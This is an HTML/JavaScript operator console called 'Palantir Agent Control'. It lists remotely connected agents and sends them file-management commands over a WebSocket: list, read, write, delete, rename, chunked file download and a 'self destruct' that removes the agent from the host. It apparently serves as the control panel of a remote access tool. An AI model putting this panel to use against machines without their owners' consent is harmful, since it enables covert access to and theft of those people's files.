<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Palantir · Agent Control</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0A0C10;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
            color: #E8EDF2;
            height: 100vh;
            overflow: hidden;
        }

        /* 50/50 split container */
        .app {
            display: flex;
            height: 100vh;
            width: 100%;
        }

        /* Left panel (50%) */
        .left-panel {
            flex: 1;
            width: 50%;
            background: #0F1117;
            border-right: 1px solid #20242E;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
        }

        .panel-header {
            padding: 24px 20px;
            border-bottom: 1px solid #20242E;
        }

        .panel-header h1 {
            font-size: 1.5rem;
            font-weight: 500;
            background: linear-gradient(135deg, #FFFFFF 0%, #9BA4B5 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.3px;
        }

        .panel-header p {
            font-size: 0.75rem;
            color: #6C7A91;
            margin-top: 6px;
        }

        .agents-section {
            padding: 16px 20px;
            border-bottom: 1px solid #1E2430;
        }

        .agents-section h3 {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #5B6E8C;
            margin-bottom: 12px;
        }

        .agent-list {
            list-style: none;
            max-height: 200px;
            overflow-y: auto;
        }

        .agent-item {
            padding: 10px 12px;
            margin-bottom: 6px;
            background: #13161E;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.1s;
            display: flex;
            align-items: center;
            gap: 10px;
            border: 1px solid transparent;
        }

        .agent-item:hover {
            background: #1A1E28;
            border-color: #2E3A4A;
        }

        .agent-item.selected {
            background: #1E2A3A;
            border-left: 3px solid #3B82F6;
        }

        .agent-status {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #22C55E;
            box-shadow: 0 0 5px #22C55E;
        }

        .agent-name {
            font-size: 0.85rem;
            font-weight: 500;
            font-family: monospace;
            flex: 1;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .command-section {
            padding: 20px 20px;
            border-bottom: 1px solid #1E2430;
        }

        .command-label {
            font-size: 0.7rem;
            text-transform: uppercase;
            color: #7E8A9E;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        .terminal-box {
            background: #0B0D12;
            border: 1px solid #242933;
            border-radius: 8px;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .prompt {
            color: #60A5FA;
            padding: 0 10px;
            font-family: monospace;
            font-weight: bold;
        }

        #terminalCommand {
            background: transparent;
            border: none;
            flex: 1;
            padding: 10px 8px;
            color: #E2E8F0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            outline: none;
        }

        .form-group {
            margin-bottom: 14px;
        }

        .form-group label {
            display: block;
            font-size: 0.7rem;
            text-transform: uppercase;
            color: #7E8A9E;
            margin-bottom: 4px;
        }

        select, input, textarea {
            width: 100%;
            background: #090B10;
            border: 1px solid #2C3240;
            border-radius: 6px;
            padding: 8px 10px;
            color: #E2E8F0;
            font-size: 0.8rem;
            font-family: monospace;
        }

        select:focus, input:focus, textarea:focus {
            border-color: #3B82F6;
            outline: none;
        }

        textarea {
            resize: vertical;
            min-height: 60px;
        }

        .custom-json-area {
            display: none;
            margin-top: 16px;
            padding-top: 12px;
            border-top: 1px solid #252C38;
        }

        .custom-json-area.active {
            display: block;
        }

        .button-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 16px;
        }

        .btn-primary {
            background: #2563EB;
            border: none;
            color: white;
            padding: 8px 14px;
            border-radius: 6px;
            font-weight: 500;
            cursor: pointer;
            font-size: 0.8rem;
        }

        .btn-primary:hover {
            background: #1D4ED8;
        }

        .btn-secondary {
            background: #1F2937;
            border: 1px solid #334155;
            color: #E2E8F0;
            padding: 8px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
        }

        .destruct-btn {
            background: #3B1E1E;
            border-color: #7F2A2A;
            color: #FFA3A3;
        }

        .destruct-btn:hover {
            background: #5A2A2A;
        }

        /* Right panel (50%) */
        .right-panel {
            flex: 1;
            width: 50%;
            display: flex;
            flex-direction: column;
            background: #0D0F14;
            overflow: hidden;
        }

        .logs-header {
            background: #0F1117;
            padding: 16px 24px;
            border-bottom: 1px solid #20242E;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logs-header h2 {
            font-size: 1rem;
            font-weight: 500;
            color: #C9D1D9;
        }

        .clear-btn {
            background: #1E293B;
            border: none;
            color: #B9C7D9;
            padding: 4px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.7rem;
        }

        .clear-btn:hover {
            background: #2D3A4E;
        }

        .logs-content {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            line-height: 1.5;
        }

        .log-entry {
            border-bottom: 1px solid #1A1E26;
            padding: 8px 0;
            white-space: pre-wrap;
            word-break: break-word;
        }

        .log-entry.error { color: #F87171; }
        .log-entry.success { color: #6EE7B7; }
        .log-entry.info { color: #94A3B8; }
        .log-prefix { color: #60A5FA; margin-right: 10px; }

        /* Plain text file listing style */
        .file-listing {
            margin: 4px 0;
            padding-left: 16px;
        }
        .file-entry {
            font-family: monospace;
            font-size: 0.75rem;
        }

        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #13161E;
        }
        ::-webkit-scrollbar-thumb {
            background: #2E3A4A;
            border-radius: 4px;
        }
    </style>
</head>
<body>
<div class="app">
    <!-- LEFT PANEL (50%) -->
    <div class="left-panel">
        <div class="panel-header">
            <h1>PALANTIR<br>AGENT</h1>
            <p>remote • low‑level • secure</p>
        </div>

        <div class="agents-section">
            <h3>CONNECTED NODES</h3>
            <ul id="agentList" class="agent-list">
                <li class="agent-item" style="justify-content:center;">waiting for agents...</li>
            </ul>
            <div id="agentCountBadge" style="font-size:0.7rem; color:#5B6E8C; margin-top:8px; text-align:center;"></div>
        </div>

        <div class="command-section">
            <div class="command-label">⨠ QUICK COMMAND</div>
            <div class="terminal-box">
                <span class="prompt">$></span>
                <input type="text" id="terminalCommand" placeholder="list | read notes.txt | write hello.txt 'content'" autocomplete="off">
                <button id="execTerminalBtn" style="background:#1E2A3A; border:none; color:#CBD5E1; padding:6px 12px; border-radius:6px; margin-right:6px; cursor:pointer;">⏎</button>
            </div>
        </div>

        <div class="command-section">
            <div class="command-label">📋 STANDARD FORM</div>
            <div class="form-group">
                <label>ACTION</label>
                <select id="actionSelect">
                    <option value="list">list</option>
                    <option value="read">read</option>
                    <option value="write">write</option>
                    <option value="append">append</option>
                    <option value="delete">delete</option>
                    <option value="mkdir">mkdir</option>
                    <option value="rename">rename</option>
                    <option value="download">download</option>
                </select>
            </div>
            <div class="form-group">
                <label>PATH (relative to Desktop)</label>
                <input type="text" id="pathInput" placeholder="e.g., folder/file.txt">
            </div>
            <div class="form-group">
                <label>CONTENT / NEW PATH</label>
                <textarea id="contentArea" rows="2" placeholder="content for write/append, or new path for rename"></textarea>
            </div>
            <div class="button-group">
                <button id="sendFormBtn" class="btn-primary">▶ SEND</button>
                <button id="customToggleBtn" class="btn-secondary">⚙️ CUSTOM JSON</button>
            </div>
            <div id="customJsonArea" class="custom-json-area">
                <div class="form-group">
                    <label>RAW JSON</label>
                    <textarea id="customJson" rows="3" placeholder='{"action":"list","path":""}'></textarea>
                </div>
                <button id="sendCustomBtn" class="btn-secondary">SEND CUSTOM</button>
            </div>
        </div>

        <div class="command-section" style="border-bottom: none;">
            <div class="button-group">
                <button id="selfDestructBtn" class="btn-secondary destruct-btn">⚠️ SELF DESTRUCT</button>
            </div>
        </div>
    </div>

    <!-- RIGHT PANEL (50%) – Event Logs -->
    <div class="right-panel">
        <div class="logs-header">
            <h2>📡 EVENT LOG</h2>
            <button id="clearLogsBtn" class="clear-btn">🗑️ CLEAR</button>
        </div>
        <div class="logs-content" id="outputArea">
            <div class="log-entry info"><span class="log-prefix">$></span> Palantir interface ready. Select a node.</div>
        </div>
    </div>
</div>

<script>
    let currentAgentId = null;
    let wsControl = null;
    let reconnectTimer = null;
    let useCustomJson = false;

    const agentListEl = document.getElementById('agentList');
    const agentCountBadge = document.getElementById('agentCountBadge');
    const actionSelect = document.getElementById('actionSelect');
    const pathInput = document.getElementById('pathInput');
    const contentArea = document.getElementById('contentArea');
    const sendFormBtn = document.getElementById('sendFormBtn');
    const customToggleBtn = document.getElementById('customToggleBtn');
    const customJsonArea = document.getElementById('customJsonArea');
    const customJson = document.getElementById('customJson');
    const sendCustomBtn = document.getElementById('sendCustomBtn');
    const outputArea = document.getElementById('outputArea');
    const terminalCommand = document.getElementById('terminalCommand');
    const execTerminalBtn = document.getElementById('execTerminalBtn');
    const clearLogsBtn = document.getElementById('clearLogsBtn');
    const selfDestructBtn = document.getElementById('selfDestructBtn');

    function addLog(text, type = 'info') {
        const div = document.createElement('div');
        div.className = `log-entry ${type}`;
        div.innerHTML = `<span class="log-prefix">$></span> ${escapeHtml(text)}`;
        outputArea.appendChild(div);
        div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, m => {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    function clearLogs() {
        outputArea.innerHTML = '<div class="log-entry info"><span class="log-prefix">$></span> Logs cleared.</div>';
    }

    function parseCommand(cmdLine) {
        cmdLine = cmdLine.trim();
        if (!cmdLine) return null;
        const parts = cmdLine.split(/\s+/);
        const action = parts[0].toLowerCase();
        let path = parts[1] || '';
        let content = parts.slice(2).join(' ');
        if (content.startsWith('"') && content.endsWith('"')) content = content.slice(1, -1);
        if (content.startsWith("'") && content.endsWith("'")) content = content.slice(1, -1);
        const cmd = { action };
        if (path) cmd.path = path;
        if (action === 'write' || action === 'append') {
            if (content) cmd.contentBase64 = btoa(unescape(encodeURIComponent(content)));
        } else if (action === 'rename') {
            if (content) cmd.newPath = content;
        } else if (action === 'download') {
            cmd.chunkSize = 65536;
        }
        return cmd;
    }

    function sendRawCommand(commandObj) {
        if (!wsControl || wsControl.readyState !== WebSocket.OPEN) {
            addLog('Not connected to signaling server', 'error');
            return false;
        }
        if (!currentAgentId) {
            addLog('No agent selected', 'error');
            return false;
        }
        commandObj.targetId = currentAgentId;
        commandObj.requestId = crypto.randomUUID();
        wsControl.send(JSON.stringify(commandObj));
        addLog(`→ ${commandObj.action} ${commandObj.path || ''}`, 'info');
        return true;
    }

    function connectControl() {
        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${location.host}/control`;
        wsControl = new WebSocket(wsUrl);
        wsControl.onopen = () => addLog('Control channel established', 'success');
        wsControl.onmessage = (e) => {
            const data = JSON.parse(e.data);
            if (data.type === 'agents_update') updateAgentList(data.agents);
            else handleResponse(data);
        };
        wsControl.onclose = () => {
            addLog('Control channel lost, reconnecting...', 'error');
            reconnectTimer = setTimeout(connectControl, 3000);
        };
    }

    function updateAgentList(agents) {
        if (!agents.length) {
            agentListEl.innerHTML = '<li class="agent-item" style="justify-content:center;">no agents online</li>';
            agentCountBadge.innerText = '';
            return;
        }
        agentListEl.innerHTML = '';
        agents.forEach(id => {
            const li = document.createElement('li');
            li.className = 'agent-item';
            li.innerHTML = `<span class="agent-status"></span><span class="agent-name">${escapeHtml(id)}</span>`;
            li.onclick = () => {
                document.querySelectorAll('.agent-item').forEach(l => l.classList.remove('selected'));
                li.classList.add('selected');
                currentAgentId = id;
                addLog(`Selected agent: ${id}`, 'success');
            };
            if (currentAgentId === id) li.classList.add('selected');
            agentListEl.appendChild(li);
        });
        agentCountBadge.innerText = `${agents.length} node(s) active`;
        if (!currentAgentId && agents.length) {
            currentAgentId = agents[0];
            const firstLi = agentListEl.querySelector('.agent-item');
            if (firstLi) firstLi.classList.add('selected');
            addLog(`Auto-selected: ${currentAgentId}`, 'info');
        }
    }

    function handleResponse(resp) {
        if (resp.error) {
            addLog(`Error: ${resp.error}`, 'error');
            return;
        }
        if (resp.type === 'download_chunk') {
            if (!window._dlBuf) window._dlBuf = new Uint8Array();
            const chunk = base64ToBytes(resp.dataBase64);
            const newBuf = new Uint8Array(window._dlBuf.length + chunk.length);
            newBuf.set(window._dlBuf, 0);
            newBuf.set(chunk, window._dlBuf.length);
            window._dlBuf = newBuf;
            if (resp.last) {
                const blob = new Blob([window._dlBuf]);
                const a = document.createElement('a');
                const url = URL.createObjectURL(blob);
                a.href = url;
                a.download = `download_${Date.now()}`;
                a.click();
                URL.revokeObjectURL(url);
                addLog(`Download completed (${window._dlBuf.length} bytes)`, 'success');
                window._dlBuf = null;
            } else {
                addLog(`Chunk offset ${resp.offset} (${chunk.length} bytes)`, 'info');
            }
            return;
        }

        if (resp.ok === true) {
            if (resp.files) {
                // Build plain text directory listing instead of HTML table
                let lines = [];
                for (const f of resp.files) {
                    const icon = f.isDir ? '📁' : '📄';
                    const sizeStr = f.isDir ? '—' : `${f.size} B`;
                    lines.push(`${icon} ${f.name} (${sizeStr})`);
                }
                const listing = lines.join('\n');
                addLog(`Directory listing:\n${listing}`, 'success');
            } else if (resp.contentBase64) {
                try {
                    const decoded = atob(resp.contentBase64);
                    addLog(`File content:\n${decoded}`, 'success');
                } catch(e) {
                    addLog(`Binary data (${resp.contentBase64.length} bytes base64)`, 'info');
                }
            } else {
                addLog(`Command success: ${JSON.stringify(resp)}`, 'success');
            }
        } else {
            addLog(`Command failed: ${resp.error || 'unknown'}`, 'error');
        }
    }

    function base64ToBytes(b64) {
        const bin = atob(b64);
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        return bytes;
    }

    execTerminalBtn.onclick = () => {
        const line = terminalCommand.value.trim();
        if (!line) return;
        const cmd = parseCommand(line);
        if (!cmd) { addLog(`Invalid syntax: ${line}`, 'error'); return; }
        sendRawCommand(cmd);
        terminalCommand.value = '';
    };
    sendFormBtn.onclick = () => {
        const action = actionSelect.value;
        const path = pathInput.value;
        let content = contentArea.value;
        const cmd = { action };
        if (path) cmd.path = path;
        if (action === 'write' || action === 'append') {
            if (content) cmd.contentBase64 = btoa(unescape(encodeURIComponent(content)));
        } else if (action === 'rename') {
            if (content) cmd.newPath = content;
        } else if (action === 'download') {
            cmd.chunkSize = 65536;
        }
        sendRawCommand(cmd);
    };
    customToggleBtn.onclick = () => {
        useCustomJson = !useCustomJson;
        customJsonArea.classList.toggle('active', useCustomJson);
        customToggleBtn.innerText = useCustomJson ? '📝 STANDARD MODE' : '⚙️ CUSTOM JSON';
    };
    sendCustomBtn.onclick = () => {
        if (!useCustomJson) return;
        try {
            const cmd = JSON.parse(customJson.value);
            if (!cmd.action) throw new Error('missing action');
            sendRawCommand(cmd);
            customJson.value = '';
        } catch(e) {
            addLog(`Invalid JSON: ${e.message}`, 'error');
        }
    };
    selfDestructBtn.onclick = () => {
        if (confirm('⚠️ SELF-DESTRUCT: this will permanently delete the agent from this machine. Proceed?')) {
            sendRawCommand({ action: 'self_destruct' });
        }
    };
    clearLogsBtn.onclick = clearLogs;
    terminalCommand.addEventListener('keypress', (e) => { if (e.key === 'Enter') execTerminalBtn.click(); });

    connectControl();
</script>
</body>
</html>
